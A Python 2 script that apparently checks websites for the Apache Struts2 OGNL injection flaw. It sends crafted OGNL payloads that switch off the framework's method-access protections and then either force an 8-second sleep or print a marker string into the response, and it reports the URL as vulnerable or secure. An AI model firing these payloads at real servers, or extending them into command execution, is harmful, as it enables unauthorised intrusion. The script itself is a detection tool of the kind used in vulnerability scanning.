#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# 老妖

import os,sys 
import httplib 
import string 
import time 
import urlparse  
  
def SendHTTPRequest(strMethod,strScheme,strHost,strURL,strParam): 
	headers = { 
		"Accept": "image/gif, */*",  
		"Referer": strScheme + "://" + strHost,   
		"Accept-Language": "zh-cn",  
		"Content-Type": "application/x-www-form-urlencoded",  
		"Accept-Encoding": "gzip, deflate",  
		"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",  
		"Host": strHost, 
		"Connection": "Keep-Alive",  
		"Cache-Control": "no-cache"  
	} 
	strRet="" 
	time_inter=0 
	try: 
		time1=0  
		time2=0 
		time1=time.time() * 1000 
		if strScheme.upper()=="HTTPS":
			con2 = httplib.HTTPSConnection(strHost, timeout = 15) 
		else: 
			con2 = httplib.HTTPConnection(strHost, timeout = 15) 
			 
		if strMethod.upper()=="POST": 
			con2.request(method="POST",url= strURL, body=strParam, headers=headers) 
		else: 
			con2.request(method="GET",url= strURL, headers=headers) 
		r2 = con2.getresponse() 
		strRet= r2.read().strip()  
		time2=time.time() * 1000     
		time_inter=time2-time1 
		con2.close 
	except BaseException,e: 
		print e 
		con2.close 
	return (time_inter,strRet) 
 
def RunTest1(strScheme,strHost,strURL): 
	payload1="""('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(8000)')(d))""" 
	(inter1,html1)=SendHTTPRequest("GET",strScheme,strHost,strURL,"")          
	(inter2,html2)=SendHTTPRequest("POST",strScheme,strHost,strURL,payload1)  
	if (inter2 - inter1)>6000: 
		return True 
	else: 
		return False 

def RunTest2(strScheme,strHost,strURL):     
	payload1="""('\\43_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(d))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(asdf)(('\\43rp\\75@org.apache.struts2.ServletActionContext@getResponse()')(c))&(fgd)(('\\43rp.getWriter().print("struts2-security")')(d))&(fgd)&(grgr)(('\\43rp.getWriter().close()')(d))=1""" 
	(inter1,html1)=SendHTTPRequest("POST",strScheme,strHost,strURL,payload1) 
	if html1.find("struts2-security")>=0: 
		return True 
	else: 
		return False 

def RunTests(strURL): 
	t_url=urlparse.urlparse(strURL) 
	strScheme=t_url.scheme 
	strHost = t_url.netloc 
	strURL1 = t_url.path 
	print "Checking " + strURL 
	if RunTest2(strScheme,strHost,strURL1): 
		print "Vulnerable! T2[echo] " + strURL 
		return True 
	elif RunTest1(strScheme,strHost,strURL1): 
		print "Vulnerable! T1[timing] " + strURL  
		return True 
	else: 
		print "Secure." 
		return False 
  
if __name__ == "__main__": 
	if len(sys.argv)!=2: 
		print "INVALID ARGUMENTS." 
		exit() 
	m_URL=sys.argv[1] 
	RunTests(m_URL)

def scan(url, scanner):
	if RunTests(url):
		return True
	else:
	 	return False

